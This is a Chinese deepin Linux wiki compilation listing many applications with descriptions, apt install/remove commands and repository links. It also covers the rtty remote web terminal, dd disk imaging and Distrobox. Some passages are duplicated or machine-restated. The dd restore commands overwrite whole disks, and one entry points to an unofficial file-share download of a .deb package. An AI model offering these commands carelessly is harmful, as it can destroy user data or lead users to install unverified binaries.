SMplayer是一款跨平台的视频播放工具，可以支持大部分的视频和音频文件。它支持音频轨道切换、允许调节亮度、对比度、色调、饱和度、伽玛值，按照倍速、4倍速等多种速度回放、还可以进行音频和字幕延迟调整以同步音频和字幕。
安装： sudo apt-get install smplayer
卸载： sudo apt-get remove smplayer
仓库地址： [http://packages.deepin.com/deepin/pool/main/s/smplayer/](http://packages.deepin.com/deepin/pool/main/s/smplayer/)

标题：Soundnode_App-已合并
Soundnode App是一款音乐播放器应用，除了简洁的播放界面和常用的播放功能之外，还具有搜索本地新歌曲、通过各种方式播放歌曲、将歌曲并保存到你喜欢的播放列表、关注/取消关注的用户等功能。

sudo apt-get install soundnode

sudo apt-get remove soundnode

http://packages.deepin.com/deepin/pool/main/s/soundnode/

标题：Spotify
Spotify是一种专有的P2P音乐流媒体服务，允许用户收听点播曲目或专辑。Spotify可以提供800万首的正版音乐的免费点播。“Spotify热”正在全球各地蔓延开来，通过Spotify您不需要花费一分钱，便可以在线收听到海量的正版音乐。

安装Spotify的命令是：sudo apt-get install spotify-client

卸载Spotify的命令是：sudo apt-get remove spotify-client

Spotify的仓库地址是：http://packages.deepin.com/deepin/pool/non-free/s/spotify-client/

Spotify的相关链接包括维基百科。

标题：Tomahawk
Tomahawk是一款网络音乐播放器，它既能播放本地或远程电脑上的音乐，也能播放来自网站的流媒体音乐，用户只需要输入歌名，Tomahawk会自动定位最佳的播放源。Tomahawk还具有智能推荐、播放朋友的音乐、在线分享播放列表和音乐等功能。安装命令为sudo apt-get install tomahawk。卸载命令为sudo apt-get remove tomahawk。仓库地址是http://packages.deepin.com/deepin/pool/main/t/tomahawk/。

标题：VLC
VLC是一款自由、开源的跨平台多媒体播放器及框架，它支持大多数的音频与视频解码器及文件格式，还可以播放大多数多媒体文件，以及DVD、音频CD、VCD及各类流媒体协议。

简介: VLC是一款自由、开源的跨平台多媒体播放器及框架，它支持大多数的音频与视频解码器及文件格式，还可以播放大多数多媒体文件，以及DVD、音频CD、VCD及各类流媒体协议。
安装: sudo apt-get install vlc
卸载: sudo apt-get remove vlc
仓库地址: http://packages.deepin.com/deepin/pool/main/v/vlc/
常见问题: 
相关链接: 维基百科：

标题：xine
Xine 是一个免费的媒体播放器，支持 CDs, DVDs 和 VCDs，支持多媒体文件格式包括：AVI, MOV, WMV, 和 MP3等，支持直接从互联网上播放视频。

安装命令：sudo apt-get install xine-ui

卸载命令：sudo apt-get remove xine-ui

仓库地址：http://packages.deepin.com/deepin/pool/main/x/xine-ui/

官方网站：https://sourceforge.net/projects/xine/ , http://xinehq.de/

标题：YesPlayMusic
YesPlayMusic 是一款高颜值的第三方网易云播放器，支持 MV 播放、歌词显示、私人 FM / 每日推荐歌曲、UnblockNeteaseMusic、自动使用各类音源替换变灰歌曲链接、每日自动签到（手机端和电脑端同时签到）、深色模式、Last.fm Scrobble、音乐云盘、自定义快捷键和全局快捷键、Mpris 等功能。

安装命令：wget https://github.com/qier222/YesPlayMusic/releases/download/v0.4.5/yesplaymusic_0.4.5_amd64.deb；sudo apt install ./yesplaymusic_0.4.5_amd64.deb

卸载命令：sudo apt remove --purge yesplaymusic

安装时下载安装包速度太慢？国内访问 Github 速度过慢，可通过安装 FastGithub 解决；或者下载我分享的 YesPlayMusic 安装包：https://wwi.lanzoup.com/iyEfI07rocvc

YesPlayMusic Github 主页：https://github.com/qier222/YesPlayMusic；YesPlayMusic 在线版：https://music.qier222.com/

标题：网易云音乐
网易云音乐是一款专注于发现与分享的音乐产品，依托专业音乐人、DJ、好友推荐及社交功能，在线音乐服务主打歌单、社交、大牌推荐和音乐指纹，以歌单、DJ节目、社交、地理位置为核心要素，主打发现和分享。

sudo apt-get install netease-cloud-music

sudo apt-get remove netease-cloud-music

http://packages.deepin.com/deepin/pool/main/n/netease-cloud-music/

https://www.deepin.org/cooperative/netease-cloud-music/

标题：GeoGebra
GeoGebra是一个动态数学应用，包含了几何、代数、表格、图形、统计和微积分。这些绘图元素均可在创建后直接在屏幕或使用命令动态改变，还可以完成大量初高等数学中的绘图工作，提供各级教育使用。

sudo apt-get install geogebra

sudo apt-get remove geogebra

http://packages.deepin.com/deepin/pool/main/g/geogebra/

标题：GNU_Octave
GNU Octave是一种高级编程语言，这种语言与Matlab兼容，主要用于数值计算。它提供了一个方便的命令行方式，可以数值求解线性和非线性问题，以及做一些数值模拟。

sudo apt-get install octave

sudo apt-get remove octave

http://packages.deepin.com/deepin/pool/main/o/octave/

标题：MATLAB
MATLAB是一个编程和数值计算平台，数百万工程师和科学家用MATLAB来分析数据、开发算法和创建模型。

进入 MATLAB 官网 https://ww2.mathworks.cn/products/matlab.html 用高校的 EDU 邮箱注册 MathWorks 账户、获取许可证后，点击“获取 MATLAB“。然后点击安装 MATLAB。点击下载 Linux 版本。下载完成后，在压缩包所在的文件夹，右击->在终端中打开执行下面命令解压：unzip -X -K matlab_R2022a_glnxa64.zip（这里用的是R2022a版本，所以文件名是matlab_R2022a_glnxa64.zip。请根据实际情况修改文件名）注意：不要右击解压压缩包！！否则可能会遇到无法安装的问题。等待解压完成后，执行下面命令安装：./install。打开 MATLAB 安装程序后，登录 MathWorks 账户，接受协议。选择许可证，点击下一步。默认安装目录会提示无权限安装，此时需要修改安装目录如果遇此情况，建议安装到~/MATLAB/2022a/。点击下一步，然后选择需要的产品进行安装。等待安装完成之后，按Ctrl+Alt+T打开终端，执行~/MATLAB/R2022a/bin/matlab即可打开 MATLAB。

删除 MATLAB 安装文件夹即可。如果你是安装在 ~/MATLAB/2022a，执行下面命令即可：rm -rf ~/MATLAB/2022a

在桌面上右击->新建文档->文本文档，将文件名改为 MATLAB.desktop 并打开将下面内容粘贴到文档内，并保存：#!/usr/bin/env xdg-open[Desktop Entry]Version=R2022aType=ApplicationTerminal=falseMimeType=text/x-matlabExec=/home/你的用户名/MATLAB/R2022a/bin/matlab -desktopName=MATLABIcon=matlabCategories=Development;Math;ScienceComment=Scientific computing environmentStartupNotify=true注意：需要将“你的用户名”替换成自己账户的用户名。可通过在终端执行whoami查看当前用户名。

打开MATLAB后，在MATLAB的命令行窗口，执行如下命令：s = settings;s.matlab.desktop.DisplayScaleFactor s.matlab.desktop.DisplayScaleFactor.PersonalValue = 2 然后重启MATLAB即可解决。

在终端执行下面命令安装openjdk：sudo apt install openjdk-8-jre 然后执行下面命令，切换到Root用户：sudo -i 修改全局环境变量：echo export MATLAB_JAVA=/usr/lib/jvm/java-8-openjdk-amd64/jre >> /etc/profile 然后重启电脑。

维基百科：https://zh.wikipedia.org/zh-cn/MATLAB MATLAB 官方网站：https://ww2.mathworks.cn/products/matlab.html ArchWiki MATLAB 页面：https://wiki.archlinux.org/title/MATLAB_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)

标题：Scilab
Scilab是一个为工程和科学应用量身定做的数值计算软件，已经广泛应用于教育和工业环境中。Scilab拥有成百可以与许多程序语言进行交互的数学函数、精巧高级的数据结构、高水平的程序设计语言和解释器等。

sudo apt-get install scilab

sudo apt-get remove scilab

http://packages.deepin.com/deepin/pool/main/s/scilab/

标题：WxMaxima
wxMaxima是一个基于wxWidgetss的计算机代数系统应用。用于数值计算、公式推导、符号计算等，提供了用户界面，包括格式化输出，阅读帮助和菜单系统。能操纵矩阵，一体化，多项式和图形等。

安装：sudo apt-get install wxmaxima

卸载：sudo apt-get remove wxmaxima

仓库地址：http://packages.deepin.com/deepin/pool/main/w/wxmaxima/

标题：Arora
Arora是一个基于QtWebKit开发的跨平台浏览器。

sudo apt-get install arora

sudo apt-get remove arora

http://packages.deepin.com/deepin/pool/main/a/arora/

https://github.com/Arora/arora

标题：Epiphany
Epiphany是一个基于WebKitGTK的网页浏览器。一般是Gnome桌面环境下的浏览器。

安装：sudo apt-get install epiphany

卸载：sudo apt-get remove epiphany

仓库地址：http://packages.deepin.com/deepin/pool/main/e/epiphany/

官方网站：https://gitlab.gnome.org/GNOME/epiphany

标题：Falkon
Falkon是一个基于QtWebEngine的网页浏览器。

安装Falkon的命令是sudo apt-get install falkon。

卸载Falkon的命令是sudo apt-get remove falkon。

Falkon的仓库地址是http://packages.deepin.com/deepin/pool/main/f/falkon/。

Falkon的官方网站是https://apps.kde.org/falkon/。

标题：FireFox火狐浏览器
FireFox是一个兼容Linux，Windows,Mac,Android以及iOS的浏览器

[进入下载页面](https://www.firefox.com.cn/download/#product-desktop-release)

标题：Konqueror
Konqueror 是 KDE 默认的网页浏览器，以及文件管理和预览的全能利器。

sudo apt-get install konqueror

sudo apt-get remove konqueror

http://packages.deepin.com/deepin/pool/main/k/konqueror/

https://apps.kde.org/zh-cn/konqueror/

标题：Midori
Midori是一个轻量级的网页浏览器，它全面整合GTK+2和GTK+3，还使用和Safari一样的WebKit引擎，具有分页浏览、会话管理、书签收藏、搜索、用户脚本和样式支持、扩展等功能。

安装命令：sudo apt-get install midori

卸载命令：sudo apt-get remove midori

仓库地址：http://packages.deepin.com/deepin/pool/main/m/midori/

标题：Nextcloud
Nextcloud是一套用于创建网络硬盘的客户端－服务器软件。其功能与百度网盘相近，但Nextcloud是自由及开放源代码软件，每个人都可以在私人服务器上部署Nextcloud。与百度网盘、阿里云盘等专有服务相比，Nextcloud的开放架构让用户可以利用应用程序的方式在服务器上新增额外的功能，并让用户可以完全完全掌控自己的数据。

安装（客户端）：sudo apt install nextcloud-desktop

卸载（客户端）：sudo apt remove --purge nextcloud-desktop

服务器端 Nextcloud 配置：请参考 https://nextcloud.com/install/#instructions-server 若使用 Docker 方式部署（推荐），请参考 https://github.com/nextcloud/all-in-one

仓库地址（客户端）：http://packages.deepin.com/deepin/pool/main/n/nextcloud-desktop/

相关链接：维基百科：https://zh.wikipedia.org/zh-cn/Nextcloud Nextcloud 官网：https://nextcloud.com/

标题：Opera
Opera是一款网络浏览器，它具有网络同步，密码管理、会话管理、鼠标手势、键盘快捷键、内置搜索引擎、智能弹出式广告拦截、网址的过滤和主题皮肤、插件扩展等功能。

sudo apt-get install opera-stable      (稳定版)

sudo apt-get install opera-developer   (开发者版本)

sudo apt-get remove opera-stable        (稳定版)

sudo apt-get remove opera-developer   (开发者版本)

http://packages.deepin.com/deepin/pool/non-free/o/opera-stable/

http://packages.deepin.com/deepin/pool/non-free/o/opera-developer/

标题：OwnCloud
ownCloud 是一个来自 KDE 社区开发的免费软件，提供私人的 Web 服务。当前主要功能包括文件管理（内建文件分享）、音乐、日历、联系人等等，可在 PC 和服务器上运行。简单来说就是一个基于 Php 的自建网盘。基本上是私人使用这样，因为直到现在开发版本也没有暴露注册功能。

安装：sudo apt-get install owncloud

卸载：sudo apt-get remove owncloud

仓库地址：[http://packages.deepin.com/deepin/pool/main/o/owncloud/](http://packages.deepin.com/deepin/pool/main/o/owncloud/)

标题：Seafile
Seafile是一个开源、跨平台的文件托管软件。文件存储在中央服务器上，并且可以通过应用程序与PC和移动设备同步，也可以通过服务器的Web界面直接访问Seafile服务器上的文件。Seafile的功能与很多网盘服务类似，例如百度网盘和阿里云盘。

sudo apt install com.seafile-gui

sudo apt remove --purge com.seafile-gui

请参考 Seafile 服务器手册 https://cloud.seafile.com/published/seafile-manual-cn/home.md 推荐使用 Docker 部署

http://packages.deepin.com/deepin/pool/main/s/seafile-client/

http://packages.deepin.com/deepin/pool/main/s/seafile/

维基百科（英文）：https://en.wikipedia.org/wiki/Seafile Seafile 官方网站：https://www.seafile.com/

标题：Vivaldi
Vivaldi是一款极速浏览器，支持英语、日语、法语、俄语等近10种语言。Vivaldi浏览器的布局与Opera浏览器非常相似，拥有不少Opera的功能，例如快速拨号界面、滑鼠手势等。另外，Vivaldi允许用户在屏幕截图上添加笔记。

sudo apt-get install vivaldi-stable
sudo apt-get install vivaldi-beta

sudo apt-get remove vivaldi-stable
sudo apt-get remove vivaldi-beta

http://packages.deepin.com/deepin/pool/main/v/vivaldi-stable/
http://packages.deepin.com/deepin/pool/main/v/vivaldi-beta/

标题：Yandex
Yandex是一款免费的浏览器，来自自俄罗斯最大的搜索引擎Yandex，在国外拥有众多的用户，具有界面简洁、浏览速度快、集成快速搜索、涡轮加速等功能，在网速缓慢的情况下，加快网页的加载速度。

sudo apt-get install yandex-browser-beta

sudo apt-get remove yandex-browser-beta

http://packages.deepin.com/deepin/pool/main/y/yandex-browser-beta/

标题：Ark
Ark是kde桌面环境下的一款解压/压缩应用，支持7zip、arj、rar、zip、bzip2、tar、gzip和RPM等格式，能够智能检测密码保护的arj、zip、rar压缩包，内置文件查看器，执行效率高。安装命令为sudo apt-get install ark，卸载命令为sudo apt-get remove ark，仓库地址是http://packages.deepin.com/deepin/pool/main/a/ark/

标题：File Roller
File Roller是GNOME桌面环境的归档管理器，它具有创建、修改、查看、提取等功能，以及可以保存为不同格式的文档。

安装File Roller的命令为：sudo apt-get install file-roller

卸载File Roller的命令为：sudo apt-get remove file-roller

File Roller的仓库地址是：http://packages.deepin.com/deepin/pool/main/f/file-roller/

File Roller的官方网站为：http://fileroller.sourceforge.net/

标题：PeaZip
PeaZip是一款解压缩软件，支持各种主流压缩格式的解压缩，支持鼠标右键操作，具备搜索及历史纪录浏览功能，图形化界面提示压缩或解压缩动作，同时还支持文件的切割与合并、安全删档、文件比对、文件完整性检查、系统效能监控、随机密码/密钥产生器等功能。

安装命令：`sudo apt-get install peazip`
卸载命令：`sudo apt-get remove peazip`
仓库地址：[http://packages.deepin.com/deepin/pool/non-free/p/peazip/](http://packages.deepin.com/deepin/pool/non-free/p/peazip/)

标题：tar
tar是一个用于储存或提取tar文件的命令行程序。 tar文件可放在磁盘中， 也可以存为普通文件。tar 的第一个参数必须是操作参数A、c、d、r、t、u、x 中的一个， 参数后面可跟着任意可选选项。tar的最后一个参数是你要处理的文件或目录的名字。 如果你指定了一个目录， 该目录的所有子目录都将被加入存档。

`tar -xvf foo.tar` 提取 foo.tar 文件并显示提取过程

`tar -xzf foo.tar.gz` 提取用 gzip 压缩的文件 foo.tar.gz

`tar -cjf foo.tar.bz2 bar/` 用 bzip 为目录 bar 创建一个叫做 foo.tar.bz2存档

`tar -xjf foo.tar.bz2 -C bar/` 把用 bzip 压缩的文件 foo.tar.bz2 提取到 bar 目录

`tar -xzf foo.tar.gz blah.txt` 把文件 blah.txt 从 foo.tar.gz 中提取出来

注意: 当压缩或提取的时候， 压缩类型选项常常是不必需的， 因为tar会根据文件的后缀自动选择压缩类型。

下列参数中必须有至少一个被使用：`-A`, `--catenate`, `--concatenate` 将一存档与已有的存档合并；`-c`, `--create` 创建一个新的存档；`-d`, `--diff`, `--compare` 比较存档与相应的未存档文件的不同之处；`-r`, `--append` 将文件附加到存档结尾；`-t`, `--list` 列出存档中文件的目录；`-u`, `--update` 仅将较新的文件附加到存档中；`-x`, `--extract`, `--get` 从存档提取文件；`--delete` 把指定文件从存档中删除（不要用于磁带！）

`-C`, `--directory 目录` 提取存档到指定目录；`-f`, `--file [主机名:]文件` 指定存档或设备中的文件 (默认是 "-"， 表示 标准输入/输出)；`-j`, `--bzip2` 用 bzip2 处理存档; 用于 .bz2 文件；`-J`, `--xz` 用 xz 处理存档; 用于 .xz 文件；`-p`, `--preserve-permissions` 提取所有保护信息；`-v`, `--verbose` 显示文件处理过程；`-z`, `--gzip`, `--ungzip` 用 gzip 处理存档; 用于 .gz 文件

tar -xvf foo.tar
    Extract foo.tar file and display the extraction process

tar -xzf foo.tar.gz
    Extract gzip-compressed file foo.tar.gz

tar -cjf foo.tar.bz2 bar/
    Create a bzip archive called foo.tar.bz2 for directory bar

tar -xjf foo.tar.bz2 -C bar/
    Extract bzip-compressed file foo.tar.bz2 to bar directory

tar -xzf foo.tar.gz blah.txt
    Extract file blah.txt from foo.tar.gz

Note: When compressing or extracting, compression type options are often unnecessary because tar automatically selects the type based on the file extension.

Common options:
  -C, --directory directory
      Extract to the specified directory

  -f, --file [hostname:]file
      Specify the file in the archive or device (default is "-", meaning stdin/stdout)

  -j, --bzip2
      Use bzip2 for the archive; for .bz2 files

  -J, --xz
      Use xz for the archive; for .xz files

  -p, --preserve-permissions
      Restore all permissions

  -v, --verbose
      Show the file processing process

  -z, --gzip, --ungzip
      Use gzip for the archive; for .gz files

标题：Xarchiver
Xarchiver是一款解压/压缩应用，支持 7zip、arj、rar、zip、bzip2、tar、gzip 和 RPM 等格式，能够智能检测密码保护的 arj、zip、rar 压缩包，内置文件查看器，执行效率高。

sudo apt-get install xarchiver

sudo apt-get remove xarchiver

http://packages.deepin.com/deepin/pool/main/x/xarchiver/

标题：FlameShot
Flameshot 是一个免费、开源的截图软件，拥有选择捕获区域、移动和调整捕获窗口大小、使用常用绘图工具（铅笔、直线、矩形、圆形、模糊、撤消/重做）进行编辑，以及选择输出方式（复制到剪贴板、保存到磁盘、上传到Imgur、使用其他程序打开）等多种功能。安装命令为：sudo apt install flameshot。卸载命令为：sudo apt remove --purge flameshot。仓库地址是http://packages.deepin.com/deepin/pool/main/f/flameshot/。官方网站是https://flameshot.org/。

标题：HotShots
HotShots是一款易于使用的屏幕捕获工具，允许用户全屏捕捉，部分捕捉，以及窗口截图。HotShots能够将截图按照预设值保存为 PNG, BMP, PBM等格式。同时，HotShots内置了强大的注释功能，能够对已截图片进行直线、圆、文字、箭头、折线、高光等图示注释。

sudo apt-get install hotshots

sudo apt-get remove hotshots

http://packages.deepin.com/deepin/pool/main/h/hotshots/

标题：Kazam
Kazam是一款简易的桌面屏幕录制工具，它可以录制视频、录制声音、截屏，支持全屏、窗口、指定区域操作，还能上传录制好的视频到YouTube及VideoBin视频分享网站。安装命令为`sudo apt-get install kazam`，卸载命令为`sudo apt-get remove kazam`，仓库地址为http://packages.deepin.com/deepin/pool/main/k/kazam/。

标题：OBS Studio
OBS Studio（Open Broadcaster Software）是一个优秀的开源免费的录屏以及直播串流软件，是跨平台的开源直播录屏软件，也是Linux系统上最受欢迎的录屏软件。安装时可使用命令：sudo apt update 和 sudo apt install ffmpeg obs-studio。使用时，打开软件按照向导配置，录屏时需要添加源，直播需要配置直播服务器。

标题：Open_Broadcaster_Software
Open Broadcaster Software是一款视频录制和直播的应用，可以捕捉游戏、窗口、视频、音频、摄像头、麦克风等内容来源，其中还内置了不少可以进行流媒体直播的服务，例如YouTube、Twitch、hitbox等，还支持自定义流媒体服务。安装命令为sudo apt-get install obs-studio。卸载命令为sudo apt-get remove obs-studio。仓库地址为http://packages.deepin.com/deepin/pool/main/o/obs-studio/

标题：Peek
Peek是一款屏幕录制工具，可以将屏幕指定区域录制成GIF动态图，录制，停止，保存三步操作就是它的全部操作了，非常简洁实用。

安装Peek的命令是：sudo apt-get install peek

卸载Peek的命令是：sudo apt-get remove peek

Peek的仓库地址为http://packages.deepin.com/deepin/pool/main/p/peek/

标题：RecordMyDesktop
recordMyDesktop是一个桌面视频录制软件，可以录制全屏、窗口，指定区域，还可以录制音频，同时通过设置参数控制将视频生成ogg格式。安装命令为`sudo apt-get install recordmydesktop`。卸载命令为`sudo apt-get remove recordmydesktop`。其仓库地址为http://packages.deepin.com/deepin/pool/main/r/recordmydesktop/。

标题：Shutter
Shutter是一款广受欢迎的截屏软件，功能十分强大。Shutter可以让您选择桌面的任意区域、指定应用窗口或者整个屏幕区域来进行截屏，同时选定区域之后依然可以通过上下左右拖动来改变选区大小。此外，Shutter也提供了图片的编辑功能，包括基本的选定，添加文字注释等。安装命令为`sudo apt-get install shutter`。卸载命令为`sudo apt-get remove shutter`。其仓库地址为[http://packages.deepin.com/deepin/pool/main/s/shutter/](http://packages.deepin.com/deepin/pool/main/s/shutter/)。相关链接包括维基百科。

标题：SimpleScreenRecorder
SimpleScreenRecorder是一款屏幕录制软件，它具有录制整个桌面、应用窗口、指定窗口大小以及音/视频同步，视频缩放等功能。

sudo apt-get install simplescreenrecorder

sudo apt-get remove simplescreenrecorder

http://packages.deepin.com/deepin/pool/contrib/s/simplescreenrecorder/

标题：Vokoscreen
Vokoscreen是一款有效的强大屏幕录制工具，提供全屏，窗口，自定义区域等多个录制模式。Vokoscreen有一个易用的图形化界面，只要点击鼠标就可以进行录制。同时，Vokoscreen可以同步捕获摄像头，支持 mkv 和 avi等格式。安装Vokoscreen需执行命令：`sudo apt-get install vokoscreen`，卸载则使用命令：`sudo apt-get remove vokoscreen`。软件仓库地址为[http://packages.deepin.com/deepin/pool/main/v/vokoscreen/](http://packages.deepin.com/deepin/pool/main/v/vokoscreen/)。

标题：Okteta
Okteta是一款十六进制编辑器，打开文件后数值和字符分别通过两列显示内容。可以在数值和字符列进行编辑和操作。安装命令为sudo apt-get install okteta，卸载命令为sudo apt-get remove okteta，其仓库地址为http://packages.deepin.com/deepin/pool/main/o/okteta/。

标题：QElectroTech
QElectroTech是一款电路图绘制软件，旨在帮助您设计电气原理图。qelectrotech已经内置了多种电气电路的图像标志，您可以通过拖拉的方式来放置图标，简单且直观。使用qelectrotech来绘制电路图，将使电路设计的质量和效率得到大大提高。安装命令为：sudo apt-get install qelectrotech。卸载命令为：sudo apt-get remove qelectrotech。仓库地址为：http://packages.deepin.com/deepin/pool/main/q/qelectrotech/

标题：SciTE
SciTE是一款免费开源的编辑器，支持C、C++、PHP、C#、Perl、Html、CSS、java、Ruby等语言的语法高亮显示，还可以导出PDF/HTML/RTF/XML/LaTex等类型文件。在Linux系统中，安装SciTE的命令是sudo apt-get install scite，卸载命令是sudo apt-get remove scite。其仓库地址为http://packages.deepin.com/deepin/pool/main/s/scite/。

标题：Sublime Text
Sublime Text是一个代码编辑器，它具有漂亮的用户界面和强大的功能，例如代码缩略图，Python的插件，代码段、语法高亮等。还可自定义快捷键绑定，菜单和工具栏等。

`sudo apt-get install sublime-text` `sudo apt-get install sublime-text-dev`

`sudo apt-get remove sublime-text` `sudo apt-get remove sublime-text-dev`

[http://packages.deepin.com/deepin/pool/non-free/s/sublime-text/](http://packages.deepin.com/deepin/pool/non-free/s/sublime-text/) [http://packages.deepin.com/deepin/pool/non-free/s/sublime-text-dev/](http://packages.deepin.com/deepin/pool/non-free/s/sublime-text-dev/)

http://packages.deepin.com/deepin/pool/non-free/s/sublime-text/ http://packages.deepin.com/deepin/pool/non-free/s/sublime-text-dev/

维基百科：

标题：UltraEdit
UltraEdit 是一个文本编辑器，可以编辑文本、十六进制、ASCII 码，可以取代记事本，内建英文单词检查、C++/JAVA/PHP/HTML等语言高亮显示，可同时编辑多个文件，搜索、替换以及备份还原功能，内置多种编辑环境，可定义所有的工具栏，支持众多格式文件编辑。

安装 UltraEdit 使用的命令是：sudo apt-get install uex

卸载 UltraEdit 使用的命令是：sudo apt-get remove uex

UltraEdit 的仓库地址是：http://packages.deepin.com/deepin/pool/non-free/u/uex/

标题：WxMEdit
wxMEdit是一个跨平台的文本/十六进制编辑器，它具有书签管理、语法高亮显示、编码识别和转换、自动换行、字数统计及自动更新等功能，以及在文本列模式下和十六进制下支持各种编码。安装命令为sudo apt-get install wxmedit，卸载命令为sudo apt-get remove wxmedit，仓库地址为http://packages.deepin.com/deepin/pool/main/w/wxmedit。

标题：可以通过Web访问的Linux终端工具
rtty 由客户端和服务端组成。客户端采用纯C实现，服务端采用 GO 语言实现，前端界面采用 vue 实现。使用 rtty 可以在任何地方通过 Web 访问您的设备的终端，通过 设备ID 来区分您的不同的设备。rtty 非常适合远程维护 Linux设备。

- 客户端 C 语言实现，非常小，适合嵌入式 Linux - 不支持 SSL：rtty(32K) + libev(56K) - 支持 SSL：+ libmbedtls(88K) + libmbedcrypto(241K) + libmbedx509(48k) - 远程批量执行命令 - 支持SSL: openssl、mbedtls、CyaSSl(wolfssl) - SSL 双向认证(mTLS) - 非常方便的上传和下载文件 - 根据 设备ID 访问不同的设备 - 支持 HTTP 代理 访问您的设备的 Web - 基于 Xterm.js 的全功能终端 - 部署简单，使用方便

部署服务端的安装依赖命令：Ubuntu、Debian使用“sudo apt install -y libev-dev libssl-dev”；ArchLinux使用“sudo pacman -S --noconfirm libev openssl”；Centos使用“sudo yum install -y libev-devel openssl-devel”。

克隆rtty代码的命令：git clone --recursive https://github.com/zhaojh329/rtty.git。编译步骤：cd rtty && mkdir build && cd build；cmake .. && make install。

启动rtty客户端的参数设置命令：sudo rtty -I 'My-device-ID' -h 'your-server' -p 5912 -a -v -d 'My Device Description'。生成token的命令：rttys token，设置密码后会得到token。使用token启动服务端：rttys -t [token值]。

通过浏览器访问rtty服务端：使用Web浏览器访问http://your-server-host:5913，点击连接按钮；或直接连接设备（需服务端配置设备白名单），URL格式为http://your-server-host:5913/connect/devid（如devid1、devid2）。

文件传输命令：从本地传输文件到远程设备用rtty -R；从远程设备传输文件到本地用rtty -S [文件名]（如rtty -S test.txt）。rtty开源地址：https://github.com/zhaojh329/rtty。

rtty是客户端-服务端架构的Linux终端Web访问工具。客户端使用C语言实现，服务端采用GO语言，前端使用Vue开发。它通过设备ID区分设备，支持远程维护。特性包括：客户端极简（无SSL版仅32K+libev56K）；支持SSL/mTLS（需mbedtls/crypto/x509库）；支持批量命令执行、文件传输（rtty -R/S）、HTTP代理和Xterm.js终端。服务端部署步骤：1) 安装系统依赖（apt/pacman/yum） 2) git克隆代码 3) cmake编译 4) 配置连接参数（需设备ID） 5) 生成访问令牌（rttys token） 6) 使用令牌启动（rttys -t）。访问地址：http://server:5913 或直连 /connect/devid

rtty支持SSL双向认证(mTLS)和主流加密库（OpenSSL/mbedtls/CyaSSl）。访问方式：1) Web登录后手动连接 2) 直连设备（需白名单）：/connect/devid1。文件传输方向：从本地到远程用 -R，反向下载用 -S filename。项目开源地址：https://github.com/zhaojh329/rtty

标题：dd
Linux dd 命令用于读取、转换并输出数据。dd 可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出。

dd命令支持的选项包括：if=文件名：输入文件名，默认为标准输入，即指定源文件；of=文件名：输出文件名，默认为标准输出，即指定目的文件；ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节；obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节；bs=bytes：同时设置读入/输出的块大小为bytes个字节。

dd命令支持的其他选项：cbs=bytes：一次转换bytes个字节，即指定转换缓冲区大小；skip=blocks：从输入文件开头跳过blocks个块后再开始复制；seek=blocks：从输出文件开头跳过blocks个块后再开始复制；count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。

dd命令的conv选项支持多种关键字，包括：ascii（转换ebcdic为ascii）、ebcdic（转换ascii为ebcdic）、lcase（把大写字符转换为小写字符）、ucase（把小写字符转换为大写字符）、noerror（出错时不停止）、notrunc（不截短输出文件）等。

dd指令是简单的复制指令，不管源和目标的编码、格式、数据结构，直接复制二进制数据从A到B。恢复的目标硬盘无需提前分区，因dd会写入分区信息。dd会占用与数据量相当的空间，可使用gzip压缩。实际使用中，因读取所有数据（包括垃圾数据），即使SSD，读盘速度也较慢。

DD备份命令示例：dd if=/dev/sda of=/dev/sdb（备份整个磁盘到另一个磁盘）；dd if=/dev/sdb of=sda.img（备份整个磁盘为img文件）；dd if=/dev/sda | gzip > sda.img（备份并且压缩）；dd if=/dev/sda bs=1M | gzip > sda.img（指定块大小，备份并压缩，据说能提速）。

DD复原命令示例：dd if=/dev/sdb of=/dev/sda（从另一个磁盘恢复）；gzip -dc sda.img | dd of=/dev/sda（从压缩的文件恢复）；gzip -dc sda.img | dd of=/dev/sda bs=1M（前面指定块大小，这里也需要）。

dd的优点：可简单粗暴地将整个磁盘或文件夹打包成img文件（如做安卓镜像时常用）；直接复制文件，较安全，不用担心权限丢失等问题。缺点：日常备份、复制速度不如rsync、cp快。

dd指令通过简单复制二进制数据实现磁盘备份，目标硬盘无需提前分区。因需读取所有数据（包括垃圾数据），即便使用SSD，速度仍较慢。可通过gzip压缩节省空间。

标题：Distrobox
deepin v23 起，deepin 发行版仓库中的所有软件包就均由 deepin 社区中维护软件包的贡献者们一同维护了，即所谓的“根发行版”或者说“根社区”。这对广大普通用户意味着两件事：直接从 Debian 软件包仓库下载并安装软件包会有更大概率搞坏 deepin 系统；仅为 Debian 或 Ubuntu 等 deb 系发行版适配的第三方应用更大概率无法直接在 deepin 上使用了。其实即便 v23 之前，我们也是从不推荐用户混源的，同是 deb 系的不同发行版的混源仿佛是个非常常见的错误用法。

Distrobox 是一个 Podman/Docker 的 wrapper 脚本，它帮助你能够快速创建并启动一个 Linux 发行版环境的容器，并帮你做好这个容器与系统的集成，使你可以方便的访问主系统以及容器内的文件与网络、使用这个容器内的图形应用等。你可以使用 distrobox 工具来轻松在 deepin v23 下安装包括 Debian 与 Ubuntu 在内的其它发行版作为“子系统”，并在其环境内安装与使用这些发行版所提供的软件包与工具。

Distrobox 在 deepin v23 下的安装：distrobox 软件包本身已经在 deepin v23 仓库中默认提供了，你只需通过下述命令安装即可：sudo apt install distrobox。安装后，就可以使用 distrobox 命令了。

创建一个名为 ubuntu 的“子系统”，使用 docker hub 上的 ubuntu 22.04 作为基础镜像的命令是：distrobox create ubuntu --image docker.io/library/ubuntu:22.04。创建完毕后，通过distrobox enter ubuntu进入容器。首次进入会有初始化过程，较慢。初始化完毕后，终端提示符主机名称变化，标志进入环境。退出环境用exit，可再次通过distrobox enter ubuntu进入。

进入Distrobox的“子系统”内后，可以像使用宿主系统一样访问网络、用户目录下的文件，启动图形应用。在Ubuntu“子系统”中，可以使用apt与snap安装Ubuntu的软件包，以及安装专为Ubuntu所提供的deb二进制包，不必担心影响宿主deepin系统的稳定性。

Distrobox 能运行 Ubuntu 子系统，还可以安装包括 Debian、Arch Linux、Fedora、openSUSE 等“子系统”。支持的完整兼容列表参见：https://github.com/89luca89/distrobox/blob/main/docs/compatibility.md#containers-distros。deepin v23 所提供的 deepin v20 兼容方案（DCM）正是基于 Distrobox 的。在v23上创建deepin v20子系统的命令：distrobox create deepin-v20 --image docker.io/linuxdeepin/apricot。

